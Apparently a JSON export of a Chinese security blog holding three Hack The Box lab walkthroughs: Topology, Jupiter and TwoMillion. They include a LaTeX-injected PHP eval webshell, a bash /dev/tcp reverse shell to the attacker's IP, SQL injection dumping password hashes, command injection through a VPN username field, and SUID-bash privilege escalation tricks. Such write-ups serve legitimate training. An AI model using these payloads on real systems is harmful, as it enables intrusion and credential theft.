{"meta":{"title":"Someb0dy's blog","subtitle":"","description":"Always Be Hungry,Be Foolish","author":"Someb0dy","url":"someb0dy.github.io","root":"/"},"pages":[{"title":"categories","date":"2023-06-14T06:17:42.558Z","updated":"2023-06-14T06:17:42.558Z","comments":true,"path":"categories/index.html","permalink":"someb0dy.github.io/categories/index.html","excerpt":"","text":""},{"title":"","date":"2023-06-14T02:34:02.537Z","updated":"2023-06-14T02:34:02.536Z","comments":false,"path":"tags/index.html","permalink":"someb0dy.github.io/tags/index.html","excerpt":"","text":"title: tagsdate: 2023-06-14 10:32:56"}],"posts":[{"title":"Topology","slug":"Topology","date":"2023-06-14T06:40:44.058Z","updated":"2023-06-14T06:41:47.036Z","comments":true,"path":"2023/06/14/Topology/","link":"","permalink":"someb0dy.github.io/2023/06/14/Topology/","excerpt":"","text":"Nmap┌──(root💀kali)-[~] └─# nmap -A 10.10.11.217 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 22:39 EDT Verbosity Increased to 1. Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE: Active NSE Script Threads: 1 (1 waiting) NSE Timing: About 93.75% done; ETC: 22:40 (0:00:00 remaining) Verbosity Increased to 2. Completed NSE at 22:40, 7.32s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 22:40 Completed NSE at 22:40, 0.00s elapsed Nmap scan report for localhost (10.10.11.217) Host is up (0.18s latency). Scanned at 2023-06-11 22:39:04 EDT for 73s Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA) | 256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA) |_ 256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Miskatonic University | Topology Group |_http-server-header: Apache/2.4.41 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: 经典22 和80 端口 image.png 添加&#x2F;etc&#x2F;hosts文件 image.png image.png 网页上发现别的子域名 image.png vhost 爆破┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/topology] └─# gobuster vhost -u http://topology.htb --append-domain -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 这里爆破到了一个dev.topology.htb的域名 latex.topology.htb image.png 这个域名下面的应用可以利用laTex表达式生成pdf文件 比如输入 \\frac{x+5}{y-3} image.png image.png 就生成了对应的pdf图片，起初很懵逼不知道该怎么做 后来搜着搜着看到了 Refer-HackTrick:https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injectionRefer-github:https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection存在laTex表达式注入 试试最简单的文件包含 image.png image.png 发现被ban了 鞭策gpt获取latex语法 image.png 发现 \\begin{filecontents}{myfile.txt} Hello, World! \\end{filecontents} 这个语法可以写入文件，该站点又是php写的尝试写一个马 \\begin{filecontents}{someb0dy.php} &lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt; \\end{filecontents} url编码 %5Cbegin%7Bfilecontents%7D%7Bsomeb0dy.php%7D%0A%3C%3Fphp%20%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%5Cend%7Bfilecontents%7D image.png image.png 但是发现好像没有写入成功 ，呜呜写了好久写不进去-_-，继续鞭策 image.png 修改后的webshell\\begin{filecontents*}{someb0dy1.php} &lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt; \\end{filecontents*} url编码 %5Cbegin%7Bfilecontents%2A%7D%7Bsomeb0dy1.php%7D%0A%3C%3Fphp%20%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%5Cend%7Bfilecontents%2A%7D image.png 终于写进去了,写了一天的webshell - -服了!!!老6 image.png 反弹shell image.png bash -i &gt;&amp; /dev/tcp/10.10.16.8/4444 0&gt;&amp;1 image.png 拿到了一个www-data用户权限的shell &#x2F;var&#x2F;www&#x2F;dev&#x2F;.htpasswd这里看着像一个密码文件 image.png vdaisley:$apr1$1ONUB&#x2F;S2$58eeNVirnRDB5zAIbIxTY0尝试解密 image.png image.png username password vdaisley calculus20 dev.topology.htb image.png image.png](https://cdn.nlark.com/yuque/0/2023/png/33561677/1686572220412-bb26728a-5689-43df-bb0b-0c3c2d188c98.png#averageHue=%23f9f9f9&clientId=u4ea9d6a6-ecf1-4&from=paste&height=714&id=u395b224b&originHeight=982&originWidth=1792&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=113268&status=done&style=none&taskId=ufe8257e8-96ae-43b8-81c0-7c9a1670cb2&title=&width=1303.2727272727273)![image.png 尝试ssh 成功登录 Root image.png 可以看到find &#x2F;opt&#x2F;gunplot -name *.plt -exec gunplot {}这条命令 意思就是在&#x2F;opt&#x2F;gunplot这个目录下搜索 *.plt的文件然后作为gunplot的参数执行Refer:http://www.gnuplot.info/docs_4.2&#x2F;node327.html image.png system “命令” 这样可以执行命令 -bash-5.0$ echo &quot;system &#39;cp /bin/bash /tmp/someb0dy;chmod u+s /tmp/someb0dy&#39;&quot;&gt;someb0dy.plt -bash-5.0$ cp someb0dy.plt /opt/gnuplot/someb0dy.plt -bash-5.0$ ./someb0dy -p someb0dy-5.0# whaomi root","categories":[{"name":"HTB","slug":"HTB","permalink":"someb0dy.github.io/categories/HTB/"}],"tags":[{"name":"latexInject","slug":"latexInject","permalink":"someb0dy.github.io/tags/latexInject/"}]},{"title":"Jupiter","slug":"Jupiter","date":"2023-06-14T05:41:58.494Z","updated":"2023-06-14T06:12:14.518Z","comments":true,"path":"2023/06/14/Jupiter/","link":"","permalink":"someb0dy.github.io/2023/06/14/Jupiter/","excerpt":"","text":"Nmap┌──(root💀kali)-[/home/kali/hacktheboxtools] └─# nmap -A 10.10.11.216 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 11:21 EDT Stats: 0:00:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 98.94% done; ETC: 11:22 (0:00:00 remaining) Stats: 0:00:58 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.29% done; ETC: 11:22 (0:00:00 remaining) Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.29% done; ETC: 11:22 (0:00:00 remaining) Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.29% done; ETC: 11:22 (0:00:00 remaining) Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.29% done; ETC: 11:22 (0:00:00 remaining) Nmap scan report for 10.10.11.216 Host is up (0.22s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA) |_ 256 6001d7db927b13f0ba20c6c900a71b41 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://jupiter.htb/ No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=6/5%OT=22%CT=1%CU=30597%PV=Y%DS=2%DC=T%G=Y%TM=647DFDB9 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=Z%TS=B)SEQ(SP=10 OS:1%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M537ST11NW7%O2=M537ST11NW7%O3 OS:=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11NW7%O6=M537ST11)WIN(W1=FE88%W2=F OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O= OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W= OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 111/tcp) HOP RTT ADDRESS 1 270.35 ms 10.10.16.1 2 176.97 ms 10.10.11.216 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 65.74 seconds 常见的两个端口22 和 80端口 image.png 添加 &#x2F;etc&#x2F;hosts10.10.11.216 jupiter.htb 主域名 image.png 根域名没啥功能点，暂时看上去，vhost 碰撞看看 ┌──(root💀kali)-[/home/kali/hacktheboxtools] └─# gobuster vhost -u http://jupiter.htb --append-domain -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 =============================================================== Gobuster v3.3 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://jupiter.htb [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt [+] User Agent: gobuster/3.3 [+] Timeout: 10s [+] Append Domain: true =============================================================== 2023/06/05 11:25:42 Starting gobuster in VHOST enumeration mode =============================================================== Found: kiosk.jupiter.htb Status: 200 [Size: 34390] Progress: 114441 / 114442 (100.00%)=============================================================== 2023/06/05 11:41:33 Finished =============================================================== kiosk.jupiter.htb有一个kiosk.jupiter.htb的域名，加入到hosts文件中 image.png 是一个grafana的应用 image.png bp看到历史记录中有这么一个包 image.png 这里能控制sql语句 image.png 这里能看到数据库的类型是PostgreSql 上hacktrick看看相关注入手法 Refer:https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql postgreSql查看数据库SELECT datname FROM pg_database; image.png postgres moon_namesdb template1 template0 ReadcredentialsSELECT usename, passwd from pg_shadow; image.png username passwd postgres Null grafana_viewer SCRAM-SHA-256$4096:K9IJE4h9f9+tr7u7AZL76w&#x3D;&#x3D;$qdrtC1sThWDZGwnPwNctrEbEwc8rFpLWYFVTeLOy3ss&#x3D;:oD4gG69X8qrSG4bXtQ62M83OkjeFDOYrypE3tUv0JOY&#x3D; RCE image.png image.png image.png 尝试反弹shell image.png image.png shell!!!! ^-^ 信息收集linpeas上linpeas 收集一下信息 image.png 跟用户有关系的信息 pspy image.png 一堆的反弹shell hhhh 同时打的人太多了 juno运行的进程 image.png 等着等着发现了uid&#x3D;1000(juno)运行了一个脚本 shadow-simulation.sh (估计是用来模拟网络用的)而且估计是定时任务 然后紧接着 删除了 &#x2F;dev&#x2F;shm&#x2F;shadow.data然后通过shadow 命令 加上&#x2F;dev&#x2F;shm&#x2F;network-simulation.yml作为参数所以我们看看配置文件 image.png network-simulation.yml general: # stop after 10 simulated seconds stop_time: 10s # old versions of cURL use a busy loop, so to avoid spinning in this busy # loop indefinitely, we add a system call latency to advance the simulated # time when running non-blocking system calls model_unblocked_syscall_latency: true network: graph: # use a built-in network graph containing # a single vertex with a bandwidth of 1 Gbit type: 1_gbit_switch hosts: # a host with the hostname &#39;server&#39; server: network_node_id: 0 processes: - path: /usr/bin/python3 args: -m http.server 80 start_time: 3s # three hosts with hostnames &#39;client1&#39;, &#39;client2&#39;, and &#39;client3&#39; client: network_node_id: 0 quantity: 3 processes: - path: /usr/bin/curl args: -s server start_time: 5s 这个配置文件看起来就像是，服务端启动一个开在 80端口web服务，然后客户端去请求这个web服务path 的参数的 位置感觉像是 执行的二进制文件的绝对路径args 自然就是参数 尝试执行chmod +s &#x2F;bin&#x2F;bash 的命令 给bash带上suid general: # stop after 10 simulated seconds stop_time: 10s # old versions of cURL use a busy loop, so to avoid spinning in this busy # loop indefinitely, we add a system call latency to advance the simulated # time when running non-blocking system calls model_unblocked_syscall_latency: true network: graph: # use a built-in network graph containing # a single vertex with a bandwidth of 1 Gbit type: 1_gbit_switch hosts: # a host with the hostname &#39;server&#39; server: network_node_id: 0 processes: - path: /usr/bin/cp args: /bin/bash /tmp/someb0dy/bash start_time: 3s # three hosts with hostnames &#39;client1&#39;, &#39;client2&#39;, and &#39;client3&#39; client: network_node_id: 0 quantity: 3 processes: - path: /usr/bin/chmod args: u+s /tmp/someb0dy/bash start_time: 5s 然后上传到靶机的&#x2F;dev&#x2F;shm&#x2F;目录下，值得说一下的是，这个目录存储的内容其实是存储在内存当中的 我先把内容上传到&#x2F;tmp&#x2F;someb0dy目录下然后再通过cp &#x2F;tmp&#x2F;someb0dy&#x2F;network-simulation.yml &#x2F;dev&#x2F;shm&#x2F; 覆盖原本的network-simulation.yml记得给&#x2F;tmp&#x2F;someb0dy附上 777的权限，不然juno用户没有权限写入到 这个文件夹 image.png 然后在&#x2F;tmp&#x2F;someb0dy下 运行.&#x2F;bash -p ,成功变成juno 权限 来到&#x2F;home&#x2F;juno查看那个脚本也可以确认 bash-5.1$ cat shadow-simulation.sh cat shadow-simulation.sh #!/bin/bash cd /dev/shm rm -rf /dev/shm/shadow.data /home/juno/.local/bin/shadow /dev/shm/*.yml cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/ ssh 公钥写入我们还可以直接写入公钥到.ssh&#x2F;authorized_keys 里面就可以ssh登录了 ssh-key -f someb0dy 生成公私钥 cp /tmp/someb0dy/someb0dy.pub /home/juno/.ssh/authorized_keys image.png 通过私钥成功登录,发现是science 组，搜索一下文件 image.png frp代理流量看着有许多端口的，搭建一个代理看看 image.png 这里为什么要搜token信息呢，因为8888端口开了一个jupyter的服务 image.png 上面用了都不对然后直接看日志文件今天6.6,里面的可以用了 image.png 用日志里面的可以 image.png image.png image.png 一样和上一个用户一样的手法，同样写入.ssh&#x2F;authorized_keys image.png 提权jovian@jupiter:/usr/local/bin$ sudo -l Matching Defaults entries for jovian on jupiter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User jovian may run the following commands on jupiter: (ALL) NOPASSWD: /usr/local/bin/sattrack 可以以管理员执行权限执行这个**&#x2F;usr&#x2F;local&#x2F;bin&#x2F;sattrack** image.png 我们直接运行这个东西，输出了一些提示信息把bash换成这个二进制文件 image.png 总结这个靶机总体来说难道中等，常规的收集信息手段，收集到子域名后，进一步收集信息，通过Postgresql 拿到Postgresql用户的shell，通过查看进程信息，来进一步获取juno的权限，接着通过juno所在的组，获取到jovian的权限，最后成功拿到root","categories":[{"name":"HTB","slug":"HTB","permalink":"someb0dy.github.io/categories/HTB/"}],"tags":[{"name":"PostgreSqlInject,Write-SSH-Key","slug":"PostgreSqlInject-Write-SSH-Key","permalink":"someb0dy.github.io/tags/PostgreSqlInject-Write-SSH-Key/"}]},{"title":"TwoMiilion","slug":"TwoMillion","date":"2023-06-14T04:22:31.259Z","updated":"2023-06-14T05:56:06.887Z","comments":true,"path":"2023/06/14/TwoMillion/","link":"","permalink":"someb0dy.github.io/2023/06/14/TwoMillion/","excerpt":"","text":"2023年6月13日 10:05:44 Nmap┌──(root💀kali)-[~] └─# nmap -sCV 10.10.11.221 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 22:03 EDT Nmap scan report for 10.10.11.221 Host is up (0.15s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA) |_ 256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519) 80/tcp open http nginx |_http-title: Did not follow redirect to http://2million.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.41 seconds 经典两个端口22,80 image.png 修改&#x2F;etc&#x2F;hosts文件 image.png image.png 有登录，猜测有注册 访问&#x2F;regiser image.png 注册发现也失败了，需要邀请码，走投无路的感觉- - ，翻翻bp历史，看看有没有生成code相关逻辑的. inviteapi.min.js image.png 设置过滤器 image.png 这个js文件看起来像和邀请码有关系的逻辑 image.png 这段代码其实是生成了一个名叫makeInviteCode 的函数,我们在console调用一下 image.png function verifyInviteCode(code) { var formData = { &quot;code&quot;: code }; $.ajax({ type: &quot;POST&quot;, dataType: &quot;json&quot;, data: formData, url: &#39;/api/v1/invite/verify&#39;, success: function(response) { console.log(response) }, error: function(response) { console.log(response) } }) } function makeInviteCode() { $.ajax({ type: &quot;POST&quot;, dataType: &quot;json&quot;, url: &#39;/api/v1/invite/how/to/generate&#39;, success: function(response) { console.log(response) }, error: function(response) { console.log(response) } }) } 有一个路由 POST /api/v1/invite/how/to/generate HTTP/1.1 Host: 2million.htb Content-Length: 0 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Content-Type: application/json Origin: http://2million.htb Referer: http://2million.htb/invite Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=stdisqd79m2j4qb1f3s9a6f250 Connection: close HTTP/1.1 200 OK Server: nginx Date: Tue, 13 Jun 2023 03:28:53 GMT Content-Type: application/json Connection: close Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Content-Length: 249 {&quot;0&quot;:200,&quot;success&quot;:1,&quot;data&quot;:{&quot;data&quot;:&quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr&quot;,&quot;enctype&quot;:&quot;ROT13&quot;},&quot;hint&quot;:&quot;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&quot;} image.png ROT13解密 image.png 他让我们请求&#x2F;api&#x2F;v1&#x2F;invite&#x2F;generate这个路由 image.png base64解密一下接着就进行注册以及登录的操作 登录后台登录之后我们进入到了一个类似HTB的界面 image.png 这里可以下载ovpn配置文件但是连接不上去 image.png 连接前把这个解析的域名记得加入到 &#x2F;etc&#x2F;hosts文件 image.png &#x2F;api&#x2F;v1我们获取路由列表登录过后有授权了 image.png 其中有一个路由settings&#x2F;update 更新设置 image.png 我们直接发起请求，回显发现Invalid content type , 失效的内容类型换成json试试 image.png image.png 根据回显操作，我们已经把自己修改成为了管理员权限 image.png 验证管理员权限成功 image.png 通过这个路由生成了一个带vpn权限的ovpn配置文件，前面自己使用普通用户的ovpn配置文件失败 结果这个地方生成的配置文件还是用不了，那么接下来我们该怎么做呢- - RCE我们可以思考一下这个地方生成配置文件的位置，是如何生成的呢？？？！ image.png 他读取我们的参数，然后在配置文件里面也有体现，所以会不会是利用类似下面代码的来实现的呢下面的代码只是例子，具体实现不一定是这样 &lt;?php $username = $_POST[&quot;username&quot;]; system(&quot;openvpn&quot;+$username); 所以这里可能存在命令执行 image.png 这样好像并没有执行成功 那当我们再加一个注释符号**# 呢？**在linux系统中 # 这个符号后面的内容会当作注释来解释 image.png 芜湖！！！ &lt;?php $username = $_POST[&quot;username&quot;]; system(&quot;openvpn&quot;+$username+&quot;Paramter&quot;); 所以他逻辑估计是这样的结构 ，后面存在别的参数 # 把后面的参数注释后就成功了同理我们也可以直接在id后面再加上一个; 也可以执行代码成功 image.png 反弹shell image.png 数据库配置文件 image.png username password admin SuperDuperPass123 www-data@2million:~/html$ which python3 which python3 /usr/bin/python3 www-data@2million:~/html$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; www-data@2million:~/html$ mysql -u admin -p mysql -u admin -p Enter password: SuperDuperPass123 Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 334231 Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. MariaDB [(none)]&gt; show databases; show databases; +--------------------+ | Database | +--------------------+ | htb_prod | | information_schema | +--------------------+ 2 rows in set (0.001 sec) MariaDB [(none)]&gt; 通过python3获取一个交互式更强的shell，连接mysql数据库 MariaDB [(none)]&gt; use htb_prod; use htb_prod; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [htb_prod]&gt; show tables; show tables; +--------------------+ | Tables_in_htb_prod | +--------------------+ | invite_codes | | users | +--------------------+ 2 rows in set (0.000 sec) MariaDB [htb_prod]&gt; select * from users; select * from users; +----+--------------+----------------------------+--------------------------------------------------------------+----------+ | id | username | email | password | is_admin | +----+--------------+----------------------------+--------------------------------------------------------------+----------+ | 11 | TRX | trx@hackthebox.eu | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq | 1 | | 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK | 1 | | 13 | admin1 | admin@test.org | $2y$10$qVCYOU26KpbHwZdKYQo2YOkthu2Lik9N7vrqZ4/NQoSPjObR0N20S | 1 | | 14 | shade1 | shade1@shade.com | $2y$10$rnJHveB0D9q6fJBtZLJ8/uy/uMI.qEicO6Lu5.k.I1talOCyPvywO | 1 | | 15 | razorrob123 | shopovrobert@gmail.com | $2y$10$KGOX6WLIrGJi9tgozKDLTeoG3v0EDGew4e0FBIJoDpqlKPwRM//Pq | 0 | | 16 | someb0dy | someb0dy@htb.com | $2y$10$SJPLEKKcBzP/G8dCxl0ADew14SzyKqSYw7/oloqYft8DTip//9BS6 | 1 | +----+--------------+----------------------------+--------------------------------------------------------------+----------+ 6 rows in set (0.000 sec) MariaDB [htb_prod]&gt; 这些数据估计是其他玩家插入的数据 查看带sh权限的用户 www-data@2million:~/html$ cat /etc/passwd | grep sh cat /etc/passwd | grep sh root:x:0:0:root:/root:/bin/bash www-data:x:33:33:www-data:/var/www:/bin/bash sshd:x:106:65534::/run/sshd:/usr/sbin/nologin fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin admin:x:1000:1000::/home/admin:/bin/bash 发现admin就是带sh的，直接用数据库的配置文件ssh登录尝试 image.png Rootadmin@2million:/var/mail$ cat admin From: ch4p &lt;ch4p@2million.htb&gt; To: admin &lt;admin@2million.htb&gt; Cc: g0blin &lt;g0blin@2million.htb&gt; Subject: Urgent: Patch System OS Date: Tue, 1 June 2023 10:45:22 -0700 Message-ID: &lt;9876543210@2million.htb&gt; X-Mailer: ThunderMail Pro 5.2 Hey admin, I&#39;m know you&#39;re working as fast as you can to do the DB migration. While we&#39;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can&#39;t get popped by that. HTB Godfather admin@2million:/var/mail$ 这里有一封邮件,说有一个CVE CVE-2023-3086Refer:https://github.com/xkaneiki/CVE-2023-0386 image.png image.png image.png 这里还有一封类似感谢信的东西 {&quot;encryption&quot;: &quot;xor&quot;, &quot;encrpytion_key&quot;: &quot;HackTheBox&quot;, &quot;encoding&quot;: &quot;base64&quot;, &quot;data&quot;: &quot;DAQCGXQgBCEELCAEIQQsSCYtAhU9DwofLURvSDgdaAARDnQcDTAGFCQEB0sgB0UjARYnFA0IMUgEYgIXJQQNHzsdFmICESQEEB87BgBiBhZoDhYZdAIKNx0WLRhDHzsPADYHHTpPQzw9HA1iBhUlBA0YMUgPLRZYKQ8HSzMaBDYGDD0FBkd0HwBiDB0kBAEZNRwAYhsQLUECCDwBADQKFS0PF0s7DkUwChkrCQoFM0hXYgIRJA0KBDpIFycCGToKAgk4DUU3HB06EkJLAAAMMU8RJgIRDjABBy4KWC4EAh90Hwo3AxxoDwwfdAAENApYKgQGBXQYCjEcESoNBksjAREqAA08QQYKNwBFIwEcaAQVDiYRRS0BHWgOBUstBxBsZXIOEwwGdBwNJ08OLRMaSzYNAisBFiEPBEd0IAQhBCwgBCEELEgNIxxYKgQGBXQKECsDDGgUEwQ6SBEqClgqBA8CMQ5FNgcZPEEIBTsfCScLHy1BEAM1GgwsCFRoAgwHOAkHLR0ZPAgMBXhIBCwLWCAADQ8nRQosTx0wEQYZPQ0LIQpYKRMGSzIdCyYOFS0PFwo4SBEtTwgtExAEOgkJYg4WLEETGTsOADEcEScPAgd0DxctGAwgT0M/Ow8ANgcdOk1DHDFIDSMZHWgHDBggDRcnC1gpD0MOOh4MMAAWJQQNH3QfDScdHWgIDQU7HgQ2BhcmQRcDJgETJxxYKQ8HSycDDC4DC2gAEQ50AAosChxmQSYKNwBFIQcZJA0GBTMNRSEAFTgNBh8xDEliChkrCUMGNQsNKwEdaAIMBSUdADAKHGRBAgUwSAA0CgoxQRAAPQQJYgMdKRMNDjBIDSMcWCsODR8mAQc3Gx0sQRcEdBwNJ08bJw0PDjccDDQKWCEPFw44BAwlChYrBEMfPAkRYgkNLQ0QSyAADDFPDiEDEQo6HEUhABUlFA0CIBFLSGUsJ0EGCjcARSMBHGgEFQ4mEUUvChUqBBFLOw5FNgcdaCkCCD88DSctFzBBAAQ5BRAsBgwxTUMfPAkLKU8BJxRDDTsaRSAKESYGQwp0GAQwG1gnB0MfPAEWYgYWKxMGDz0KCSdPEicUEQUxEUtiNhc9E0MIOwYRMAYaPRUKBDobRSoODi1BEAM1GAAmTwwgBEMdMRocYgkZKhMKCHQHA2IADTpBEwc1HAMtHRVoAA0PdAELMR8ROgQHSyEbRTYAWCsODR89BhAjAxQxQQoFOgcTIxsdaAAND3QNEy0DDi1PQzwxSAQwClghDA4OOhsALhZYOBMMHjBICiRPDyAAF0sjDUUqDg4tQQIINwcIMgMROwkGD3QcCiUKDCAEEUd0CQsmTw8tQQYKMw0XLhZYKQ8XAjcBFSMbHWgVCw50Cwo3AQwkBBAYdAUMLgoLPA4NDidIHCcbWDwOQwg7BQBsZXIABBEOcxtFNgBYPAkGSzoNHTZPGyAAEx8xGkliGBAtEwZLIw1FNQYUJEEABDocDCwaHWgVDEskHRYqTwwgBEMJOx0LJg4KIQQQSzsORSEWGi0TEA43HRcrGwFkQQoFJxgMMApYPAkGSzoNHTZPHy0PBhk1HAwtAVgnB0MOIAAMIQ4UaAkCCD8NFzFDWCkPB0s3GgAjGx1oAEMcOxoJJk8PIAQRDnQDCy0YFC0FBA50ARZiDhsrBBAYPQoJJ08MJ0ECBzhGb0g4ETwJQw8xDRUnHAxoBhEKIAERNwsdZGtpPzwNRQoOGyM1Cw4WBx1iOx0pDA==&quot; image.png 感谢信Dear HackTheBox Community, We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you. From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community. To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come. Here&#39;s to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all. With deepest gratitude, The HackTheBox Team","categories":[{"name":"HTB","slug":"HTB","permalink":"someb0dy.github.io/categories/HTB/"}],"tags":[{"name":"JavaScript,RCE,CVE-2023-3086","slug":"JavaScript-RCE-CVE-2023-3086","permalink":"someb0dy.github.io/tags/JavaScript-RCE-CVE-2023-3086/"}]}],"categories":[{"name":"HTB","slug":"HTB","permalink":"someb0dy.github.io/categories/HTB/"}],"tags":[{"name":"latexInject","slug":"latexInject","permalink":"someb0dy.github.io/tags/latexInject/"},{"name":"PostgreSqlInject,Write-SSH-Key","slug":"PostgreSqlInject-Write-SSH-Key","permalink":"someb0dy.github.io/tags/PostgreSqlInject-Write-SSH-Key/"},{"name":"JavaScript,RCE,CVE-2023-3086","slug":"JavaScript-RCE-CVE-2023-3086","permalink":"someb0dy.github.io/tags/JavaScript-RCE-CVE-2023-3086/"}]}